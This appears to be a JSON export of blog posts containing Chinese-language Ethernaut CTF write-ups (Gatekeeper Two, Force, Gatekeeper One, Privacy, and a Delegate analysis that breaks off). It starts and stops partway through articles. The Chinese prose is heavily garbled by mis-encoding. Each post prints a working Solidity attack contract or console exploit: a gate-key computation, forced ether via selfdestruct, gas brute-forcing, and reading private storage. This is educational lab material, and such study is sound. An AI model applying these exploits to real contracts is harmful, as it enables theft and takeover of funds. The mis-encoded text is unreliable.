bytes``msg.sender``Exploiter``uint64 è¯¥æŒ‡ä»¤a ^ bæ˜¯æŒ‰ä½XORæ“ä½œã€‚æ“ä½œXORæ˜¯è¿™æ ·çš„ï¼šå¦‚æœ position ä¸­çš„ä½ç›¸ç­‰ï¼Œå®ƒå°†å¯¼è‡´0otherwise in a 1ã€‚ä½¿a ^ b = type(uint64).maxï¼ˆæ‰€ä»¥æ‰€æœ‰1ï¼‰bå¿…é¡»æ˜¯çš„å€’æ•°aã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬gateKeyå¿…é¡»æ˜¯bytes8(keccak256(abi.encodePacked(msg.sender))) åœ¨ solidity ä¸­ï¼Œæ²¡æœ‰â€œåå‘â€æ“ä½œï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡XORåœ¨è¾“å…¥å’Œå€¼ä¹‹é—´è¿›è¡Œæ“ä½œæ¥é‡æ–°åˆ›å»ºå®ƒFï¼Œå…¶ä¸­åªæœ‰ sã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥gateKeyé€šè¿‡æ‰§è¡Œæ¥è®¡ç®—æ­£ç¡®çš„bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF 2.3 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ contract Hack &#123; constructor(GatekeeperTwo target) &#123; uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); uint64 k = s ^ type(uint64).max; bytes8 key = bytes8(k); require(target.enter(key), &quot;failed&quot;); &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xf0f0bbA56D2035804D70D9Ed802e422195b62134 3.2 é€šè¿‡ä¼ å…¥å®ä¾‹çš„åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Force","slug":"CTFS/ethernaut/Force","date":"2023-01-09T03:32:10.000Z","updated":"2023-01-09T03:32:10.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Force/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Force/","excerpt":"","text":"Force1. é¢˜ç›®è¦æ±‚ 1.1 é¢˜ç›®ï¼š è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äº0 è¿™å¯èƒ½æœ‰å¸®åŠ©: Fallback æ–¹æ³• æœ‰æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦æœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦. é˜…è¯»ä¸Šæ–¹çš„å¸®åŠ©é¡µé¢, â€œBeyond the consoleâ€ éƒ¨åˆ† 1.2 è¦æ±‚ï¼š ä½¿åˆçº¦çš„ä½™é¢å¤§äº0 1.3 åˆçº¦ä»£ç ï¼š 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &#123;/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =Ã¸= / (______)__m_m)*/&#125; 2. åˆ†æ 2.1 æˆ‘çœ‹åˆ°è¿™ä¸ªåˆçº¦é¦–å…ˆæ˜¯æŒºæ— è¯­çš„å“ˆå“ˆå“ˆå“ˆğŸ¤£ğŸ¤£ğŸ¤£ 2.2 åˆçº¦ä¸­æ²¡æœ‰æ²¡æœ‰fallbackå’Œreceiveå‡½æ•°æ¥æ”¶ä»¥å¤ªï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•ä¸€ä¸ªpayableçš„å‡½æ•°å¯ä»¥æ¥æ”¶ä»¥å¤ªï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å¼ºåˆ¶ç»™è¯¥åˆçº¦æ‰“é’± 2.3 ç”±äºåˆçº¦ä¸­ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å”¯ä¸€èƒ½è§£å†³è¿™ä¸ªæŒ‘æˆ˜çš„å°±æ˜¯ä½¿ç”¨æ–¹æ³•selfdestruct() 2.4 selfdestruct()å‡½æ•°çš„è§£é‡Šï¼š selfdestructå‘½ä»¤å¯ä»¥ç”¨æ¥åˆ é™¤æ™ºèƒ½åˆçº¦ï¼Œå¹¶å°†è¯¥åˆçº¦å‰©ä½™ETHè½¬åˆ°æŒ‡å®šåœ°å€ã€‚selfdestructæ˜¯ä¸ºäº†åº”å¯¹åˆçº¦å‡ºé”™çš„æç«¯æƒ…å†µè€Œè®¾è®¡çš„ã€‚å®ƒæœ€æ—©è¢«å‘½åä¸ºsuicideï¼ˆè‡ªæ€ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªè¯å¤ªæ•æ„Ÿã€‚ä¸ºäº†ä¿æŠ¤æŠ‘éƒçš„ç¨‹åºå‘˜ï¼Œæ”¹åä¸ºselfdestructã€‚ selfdestruct() å‡½æ•°çš„ä½¿ç”¨ï¼š 2.5 æ”»å‡»åˆçº¦ 123456contract Exploiter &#123; constructor(address payable _to) public payable &#123; // è‡ªæ¯æ—¶å°†æ‰€æœ‰çš„ `msg.value` é‡å®šå‘åˆ° `to` selfdestruct(_to); &#125; &#125; éƒ¨ç½²Exploiteråˆçº¦, æ„é€ å™¨é»˜è®¤å°†Expoliteråˆçº¦çš„ä½™é¢è½¬ç»™ _to åœ°å€ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x896317e85Fb12eA5bAD846A59870f3F672fAB7A4 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œå¹¶åœ¨éƒ¨ç½²æ—¶å¡«å…¥å…³å¡å®ä¾‹åœ°å€ 3.3 è°ƒç”¨Deploy() å‡½æ•° 3.4 è°ƒç”¨å®ä¾‹éƒ¨ç½²çš„åˆçº¦æŸ¥çœ‹åˆçº¦ä½™é¢ï¼Œç»“æœ balance &gt; 0 3.5 æäº¤æ¡ˆä¾‹ï¼Œå¹¶æŸ¥çœ‹è¿”å›ç»“æœ 3.6 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper One","slug":"CTFS/ethernaut/Gatekeeper One","date":"2023-01-09T03:02:15.000Z","updated":"2023-01-09T03:02:15.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Gatekeeper One/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Gatekeeper%20One/","excerpt":"","text":"Gatekeeper One1. é¢˜ç›®è¦æ±‚ 1.1 è¶Šè¿‡å®ˆé—¨äººå¹¶ä¸”æ³¨å†Œä¸ºä¸€ä¸ªå‚èµ›è€…æ¥å®Œæˆè¿™ä¸€å…³. è¿™å¯èƒ½æœ‰å¸®åŠ©: æƒ³ä¸€æƒ³ä½ åœ¨ Telephone å’Œ Token å…³å¡å­¦åˆ°çš„çŸ¥è¯†. ä½ å¯ä»¥åœ¨ solidity æ–‡æ¡£ä¸­æ›´æ·±å…¥çš„äº†è§£ gasleft() å‡½æ•° (å‚è§ here å’Œ here). 1.2 é¢˜ç›®ä»£ç  1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(gasleft() % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; 2.åˆ†ætipsï¼šå‚è€ƒåšå®¢ 2.1è®©æˆ‘ä»¬æŠŠè§£é‡Šåˆ†æˆä¸‰ä¸ªä¸åŒçš„éƒ¨åˆ† é—¨ 1ï¼šmsg.senderå’Œtx.origin è¦æ‰“å¼€è¿™æ‰‡é—¨ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£msg.senderå®ƒä»¬tx.originä¹‹é—´çš„åŒºåˆ«ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹ Solidity æ–‡æ¡£å¯¹è¿™äº›å…¨å±€å˜é‡çš„çœ‹æ³•ï¼š msg.sender( address): æ¶ˆæ¯çš„å‘é€è€…ï¼ˆå½“å‰é€šè¯ï¼‰ tx.origin( address): äº¤æ˜“çš„å‘é€æ–¹ï¼ˆå®Œæ•´çš„è°ƒç”¨é“¾ï¼‰ å½“äº¤æ˜“ç”± EOA è¿›è¡Œå¹¶ç›´æ¥ä¸æ™ºèƒ½åˆçº¦äº¤äº’æ—¶ï¼Œè¿™äº›å˜é‡å°†å…·æœ‰ç›¸åŒçš„å€¼ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®ƒä¸ä¸­é—´äººåˆçº¦äº¤äº’Aï¼Œç„¶åBé€šè¿‡ç›´æ¥è°ƒç”¨ï¼ˆè€Œä¸æ˜¯ a delegatecallï¼‰ä¸å¦ä¸€ä¸ªåˆçº¦äº¤äº’ï¼Œé‚£ä¹ˆè¿™äº›å€¼å°†ä¸åŒã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼š msg.senderå°†æœ‰ EOA åœ°å€ tx.origin``Aå°†æœ‰åˆåŒçš„åœ°å€ å› ä¸ºä¸ºäº†gateOneä¸æ¢å¤ï¼Œæˆ‘ä»¬éœ€è¦è®©msg.sender != tx.originè¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»enterä»æ™ºèƒ½åˆçº¦è€Œä¸æ˜¯ç›´æ¥ä»ç©å®¶çš„ EOA è°ƒç”¨ã€‚ è¿™ä¸æ˜¯æŒ‘æˆ˜çš„ä¸€éƒ¨åˆ†ï¼Œä½†æˆ‘å»ºè®®æ‚¨é˜…è¯»æˆ‘åœ¨è¿›ä¸€æ­¥é˜…è¯»ä¸­åˆ—å‡ºçš„å…³äºä¸€äº›å®‰å…¨é—®é¢˜å’Œæœ€ä½³å®è·µtx.orginä»¥åŠä½•æ—¶ä¸åº”ä½¿ç”¨å®ƒçš„å†…å®¹ã€‚ 2å·é—¨ï¼šgasleft() ä»å…³äºå…¨å±€å˜é‡çš„ Solidity æ–‡æ¡£ä¸­æˆ‘ä»¬çŸ¥é“è¿™æ˜¯ä¸€ä¸ªè¿”å›äº¤æ˜“å‰©ä½™æ°”ä½“gasleft() returns (uint256)çš„å‡½æ•°ã€‚ é‡è¦çš„æ˜¯è¦çŸ¥é“æ¯ä¸ª Solidity æŒ‡ä»¤å®é™…ä¸Šæ˜¯ä¸€ç³»åˆ—ä½çº§ EVM æ“ä½œç çš„é«˜çº§è¡¨ç¤ºã€‚æ‰§è¡Œæ“ä½œç åGASï¼ˆåœ¨EVM ä»£ç æ–‡æ¡£ç«™ç‚¹ä¸Šé˜…è¯»æ›´å¤šå†…å®¹ï¼‰ï¼Œè¿”å›å€¼æ˜¯æ‰§è¡Œåå‰©ä½™çš„æ°”ä½“é‡ï¼Œä¹Ÿæ˜¯GASå½“å‰æ¶ˆè€—2 gasçš„æ“ä½œç ã€‚ äº‹æƒ…åœ¨è¿™é‡Œå˜å¾—è¿‡äºå¤æ‚ï¼Œå› ä¸ºè¦é€šè¿‡æ£€æŸ¥ï¼ŒgateTwoæ‚¨å¿…é¡»è°ƒç”¨level.enter&#123;gas: exactAmountOfGas&#125;(gateKey)éå¸¸ç‰¹å®šæ•°é‡çš„æ°”ä½“ï¼Œä»¥ä¾¿gasleft().mod(8191)è¿”å›0ï¼ˆå‰©ä½™çš„æ°”ä½“å¿…é¡»æ˜¯ 8191 çš„å€æ•°ï¼‰ã€‚ ä½ çŒœä¸åˆ°è¿™ä¸ªæ•°å­—ï¼Œå› ä¸ºä½ éœ€è¦ç¿»è¯‘ EVM æ“ä½œç ä¸­çš„æ‰€æœ‰ Solidity ä»£ç ï¼Œè®¡ç®—å®ƒä»¬å„è‡ªæ¶ˆè€—çš„ gas å¹¶æµªè´¹å¤§é‡æ—¶é—´ï¼ˆé™¤éä½ çš„ç›®æ ‡ä¹Ÿæ˜¯æŒæ¡ EVMï¼Œä½†å¯¹äºè¿™ä¸ªä¸»é¢˜æœ‰è¿˜æœ‰å¤§é‡å…¶ä»–èµ„æºï¼Œä¾‹å¦‚è®©æˆ‘ä»¬ç© EVM è°œé¢˜â€”â€”è¾¹ç©è¾¹å­¦ä¹ ä»¥å¤ªåŠ EVMï¼ï¼‰ã€‚æ‚¨è¿˜éœ€è¦è®°ä½ï¼Œgas æˆæœ¬å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œå…·ä½“å–å†³äºä½¿ç”¨å“ªä¸ª Solidity ç¼–è¯‘å™¨ç‰ˆæœ¬å°†ä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ä»¥åŠåœ¨æ­¤è¿‡ç¨‹ä¸­ä½¿ç”¨äº†å“ªäº›ç¼–è¯‘æ ‡å¿—ã€‚ä¸€å›¢ç³Ÿã€‚ æˆ‘ä»¬å¯ä»¥åšä»€ä¹ˆï¼Ÿå¥½å§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç®€å•çš„æ–¹æ³•å»æš´åŠ›ç ´è§£å®ƒï¼æŒ‰ç…§cmichel çš„å»ºè®®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æˆ‘ä»¬æ­£åœ¨ä½¿ç”¨æœ¬åœ°æµ‹è¯•ç¯å¢ƒï¼ˆæˆ–åˆ†å‰çš„ç¯å¢ƒï¼‰è¿™ä¸€äº‹å®ã€‚ æˆ‘ä»¬çŸ¥é“äº¤æ˜“ä½¿ç”¨çš„ gasenterå¿…é¡»è‡³å°‘ä¸º 8191 åŠ ä¸Šæ‰§è¡Œè¿™äº›æ“ä½œç æ‰€èŠ±è´¹çš„æ‰€æœ‰ gasã€‚æˆ‘ä»¬å¯ä»¥è¿›è¡ŒèŒƒå›´çŒœæµ‹å¹¶å¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œç›´åˆ°å®ƒèµ·ä½œç”¨ä¸ºæ­¢ã€‚è¿™æ˜¯ä»£ç ç¤ºä¾‹ï¼š 123456for (uint256 i = 0; i &lt;= 8191; i++) &#123; try victim.enter&#123;gas: 800000 + i&#125;(gateKey) &#123; console.log(&quot;passed with gas -&gt;&quot;, 800000 + i); break; &#125; catch &#123;&#125;&#125; ä½ ä»ä¸€ä¸ªåŸºæœ¬çš„ gas å€¼å¼€å§‹åªæ˜¯ä¸ºäº†ç¡®ä¿äº¤æ˜“ä¸ä¼šå› ä¸º Out of Gas å¼‚å¸¸è€Œæ¢å¤ï¼Œç„¶åä½ è¯•å›¾æ‰¾åˆ°å“ªä¸ª gas å€¼å¯ä»¥ä½¿äº¤æ˜“æˆåŠŸã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ˆsolidity ç¼–è¯‘å™¨ + ä¼˜åŒ–æ ‡å¿—ï¼‰æ­£ç¡®çš„ gas å€¼æ˜¯ï¼š802929 å…³å¡ 3ï¼šé“¸é€ å¦‚ä½•åœ¨ Solidity ä¸­å·¥ä½œ è¦è§£å†³æœ€ç»ˆå…³å£ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä»ä¸€ç§ç±»å‹åˆ°å¦ä¸€ç§ç±»å‹çš„è½¬æ¢ä»¥åŠå‘ä¸‹è½¬æ¢çš„å·¥ä½œåŸç†ã€‚Solidity æ–‡æ¡£å¯¹å…¶è¿›è¡Œäº†å¾ˆå¥½çš„è§£é‡Šï¼š Solidity æ–‡æ¡£ï¼šåŸºæœ¬ç±»å‹ä¹‹é—´çš„è½¬æ¢ Solidity æ–‡æ¡£ï¼šæ–‡å­—å’ŒåŸºæœ¬ç±»å‹ä¹‹é—´çš„è½¬æ¢ å½“æ‚¨ä»è¾ƒå°çš„ç±»å‹è½¬æ¢ä¸ºè¾ƒå¤§çš„ç±»å‹æ—¶ï¼Œæ²¡æœ‰é—®é¢˜ã€‚æ‰€æœ‰çš„é«˜ä½éƒ½ç”¨é›¶å¡«å……ï¼Œå€¼ä¸å˜ã€‚é—®é¢˜æ˜¯å½“æ‚¨å°†è¾ƒå¤§çš„ç±»å‹è½¬æ¢ä¸ºè¾ƒå°çš„ç±»å‹æ—¶ã€‚æ ¹æ®å€¼çš„ä¸åŒï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°æ•°æ®ä¸¢å¤±çš„æƒ…å†µï¼Œå› ä¸ºé‚£äº›é«˜é˜¶ä½ä¼šä¸¢å¤±å¹¶è¢«æˆªæ–­ã€‚ä¾‹å¦‚ï¼Œuint16(0x0101)æ˜¯257åè¿›åˆ¶çš„ï¼Œä½†å¦‚æœä½ å‘ä¸‹è½¬æ¢å®ƒï¼Œuint8å®ƒå°†æ˜¯1åè¿›åˆ¶çš„ï¼ 2.2 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ 12345678910111213141516interface IGateKeeperOne &#123; function entrant() external view returns (address); function enter(bytes8) external returns (bool);&#125;contract Hack &#123; function enter (address _target, uint256 gas) external &#123; IGateKeeperOne target = IGateKeeperOne(_target); uint16 k16 = uint16(uint160(tx.origin)); uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); bytes8 key = bytes8(k64); require(gas &lt; 8191, &quot;gas &gt; 8191&quot;); require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &quot;failed&quot;); &#125;&#125; 3.è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xAd682B7a072dc407361a23D0C9Ee9f1C16dEa187 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œè°ƒç”¨enter() å‡½æ•°ï¼Œå°†å…³å¡å®ä¾‹åœ°å€ä¼ å…¥enter() å‡½æ•°ä¸­ï¼Œå¹¶è®¾ç½®gas &#x3D; 256 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Privacy","slug":"CTFS/ethernaut/Privacy","date":"2023-01-09T02:16:15.000Z","updated":"2023-01-09T02:16:15.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Privacy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Privacy/","excerpt":"","text":"Privacy1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸ªåˆçº¦çš„åˆ¶ä½œè€…éå¸¸å°å¿ƒçš„ä¿æŠ¤äº†æ•æ„ŸåŒºåŸŸçš„ storage.è§£å¼€è¿™ä¸ªåˆçº¦æ¥å®Œæˆè¿™ä¸€å…³.è¿™äº›å¯èƒ½æœ‰å¸®åŠ©: ç†è§£ storage çš„åŸç† ç†è§£ parameter parsing çš„åŸç† ç†è§£ casting çš„åŸç† 1.2 é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy &#123; bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(block.timestamp); bytes32[3] private data; constructor(bytes32[3] memory _data) &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^` .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*., *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^ ,---/V\\ `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*. ~|__(o.o) ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27; UU UU */&#125; 2. åˆ†æ 2.1 ç›®æ ‡ï¼šå°†lockedä¿®æ”¹ä¸ºfalse bool public lockedåˆå§‹åŒ–ä¸º true å¹¶ä¿å­˜å¿…é¡»è®¾ç½®ä¸º false æ‰èƒ½èµ¢å¾—æŒ‘æˆ˜çš„å€¼ bytes32[3] private dataæ˜¯å­˜å‚¨æˆ‘ä»¬çš„å¯†é’¥çš„å˜é‡ã€‚æˆ‘ä»¬éœ€è¦æ‰¾å‡ºdata[2]è§£å†³æŒ‘æˆ˜çš„ä»·å€¼ 2.2 æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰å…¶ä»–å˜é‡ä»…è§†ä¸ºâ€œå­˜å‚¨å¡«å……â€ï¼Œä»¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦è¯»å–çš„å†…å®¹ ( data[2]) ä»¥è§£å†³æŒ‘æˆ˜ã€‚ constructor(bytes32[3] memory _data)åˆå§‹åŒ–dataå˜é‡çš„å€¼ ç„¶åæˆ‘ä»¬åªéœ€æ£€æŸ¥æˆ‘ä»¬ä¼ é€’çš„è¾“å…¥unlock(bytes16 _key)æ˜¯å¦ä¸å€¼åŒ¹é…ã€‚å¦‚æœæ¯”è¾ƒè¿”å› trueï¼Œæˆ‘ä»¬å°±è§£é”äº†åˆçº¦ï¼Œé€šè¿‡äº†æŒ‘æˆ˜ã€‚byte16 _key``data[2]``true 2.3 dataé¦–å…ˆï¼Œå¿…é¡»æ£€ç´¢å˜é‡ä¸­çš„æ•°æ®ã€‚è¿™å¯ä»¥é€šè¿‡ä»åŒºå—é“¾ä¸Šçš„åˆçº¦å­˜å‚¨ä¸­æå–æ•°æ®æ¥å®Œæˆã€‚åœ¨ brownie ä¸­ï¼Œè¿™å¯ä»¥ä½¿ç”¨ æ¥å®Œæˆweb3.eth.getStorageAt()ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆçº¦çš„åœ°å€ï¼Œä»¥åŠè¦æŸ¥çœ‹çš„åˆçº¦å­˜å‚¨æ§½çš„æ–¹å‘ã€‚æ¯ä¸ªæ§½çš„å®¹é‡ä¸º 32 å­—èŠ‚ï¼ˆ256 ä½ï¼‰ï¼Œè¿™æ„å‘³ç€å®é™…å¡«æ»¡ 32 å­—èŠ‚æ§½çš„æ•°æ®ç±»å‹å°†å ç”¨æ•´ä¸ªæ§½ï¼Œå› æ­¤åç»­æ•°æ®ç±»å‹å°†æ»šåŠ¨åˆ°ä¸‹ä¸€ä¸ªæ§½ã€‚å¦‚æœæ•°æ®ç±»å‹å£°æ˜ä¸ºuint256æˆ–bytes32ï¼Œå®ƒå°†å§‹ç»ˆå ç”¨ä¸€ä¸ªå®Œæ•´çš„å­˜å‚¨æ§½ï¼Œå› ä¸ºè¿™äº›ç±»å‹çš„å¤§å°å·²ç»æ˜¯ 32 å­—èŠ‚ã€‚ åœ¨éšç§åˆçº¦çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çŸ¥é“ç›¸å…³æ•°æ®æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ dataã€‚å› æ­¤ï¼Œè¦æå–è¿™ä¸ªï¼Œæˆ‘ä»¬å¿…é¡»ç¡®å®šè¿™æ¡æ•°æ®åœ¨å“ªé‡Œï¼Œåœ¨ä»€ä¹ˆå­˜å‚¨æ§½ä¸­ã€‚ 2.4 å‚è€ƒåšå®¢ 2.5 åœ¨æµè§ˆå™¨æ§åˆ¶å°ä¾æ¬¡æ‰§è¡Œ web3.eth.getStorageAt() ** ï¼Œdata.slice(0,34)** å‘½ä»¤ 3 .è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0 3.2 ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹ä»£ç å¾—åˆ° data[2] addr = &quot;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&quot; &#39;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&#39; await web3.eth.getStorageAt(addr, 5) &#39;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#39; data = &quot;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&quot; &#39;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#39; data.slice(0,34) &#39;0xa9cbb829703de0df913fc95cc78d10df&#39; 3.3 è°ƒç”¨å®ä¾‹éƒ¨ç½²çš„åˆçº¦ï¼Œå¹¶æŸ¥çœ‹locked çš„å€¼ä¸ºtrue 3.4 å°†æ‰§è¡Œdata.slice(0,34) å¾—åˆ°çš„å€¼ä¼ å…¥unlockçš„å½¢å‚ä¸­ï¼Œå¹¶è°ƒç”¨unlock() å‡½æ•° 3.5 æŸ¥çœ‹lockedçš„å€¼ï¼Œå€¼ç”±true å˜æˆ false 3.6 æäº¤å®ä¾‹ 3.7 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Delegate","slug":"CTFS/ethernaut/Delegate","date":"2023-01-09T01:32:10.000Z","updated":"2023-01-09T01:32:10.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Delegate/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Delegate/","excerpt":"","text":"Delegate1. é¢˜ç›®è¦æ±‚ 1.1 è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ç”³æ˜ä½ å¯¹ä½ åˆ›å»ºå®ä¾‹çš„æ‰€æœ‰æƒ. è¿™å¯èƒ½æœ‰å¸®åŠ© ä»”ç»†çœ‹solidityæ–‡æ¡£å…³äº delegatecall çš„ä½çº§å‡½æ•°, ä»–æ€ä¹ˆè¿è¡Œçš„, ä»–å¦‚ä½•å°†æ“ä½œå§”æ‰˜ç»™é“¾ä¸Šåº“, ä»¥åŠä»–å¯¹æ‰§è¡Œçš„å½±å“. Fallback æ–¹æ³• æ–¹æ³• ID 1.2 é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123; address public owner; constructor(address _owner) &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; constructor(address _delegateAddress) &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; fallback() external &#123; (bool result,) = address(delegate).delegatecall(msg.data); if (result) &#123; this; &#125; &#125;&#125; 2. åˆ†æ 2.1 elegation.sol è¿™æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®çš„åˆçº¦ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹ã€‚å®ƒæœ‰ä¸¤ä¸ªçŠ¶æ€å˜é‡ï¼š address public ownerå­˜å‚¨åˆçº¦æ‰€æœ‰è€…çš„å…¬å…±å˜é‡ Delegate delegate``Delegateå¯¹æˆ‘ä»¬åˆšåˆšçœ‹åˆ°çš„åˆåŒçš„å¼•ç”¨ åˆçº¦constructorçš„ å°†å…¶address _delegateAddressä½œä¸ºå”¯ä¸€çš„è¾“å…¥å‚æ•°ï¼Œdelegateç”¨å®ƒåˆå§‹åŒ–çŠ¶æ€å˜é‡å¹¶ç”¨ åˆå§‹åŒ–æ‰€æœ‰è€…msg.sender 2.2 é€šè¿‡ä¿®æ”¹ç‡ƒæ–™é™åˆ¶çš„æ–¹æ³•ï¼Œå‡ºé”™äº†ã€‚ã€‚ã€‚ 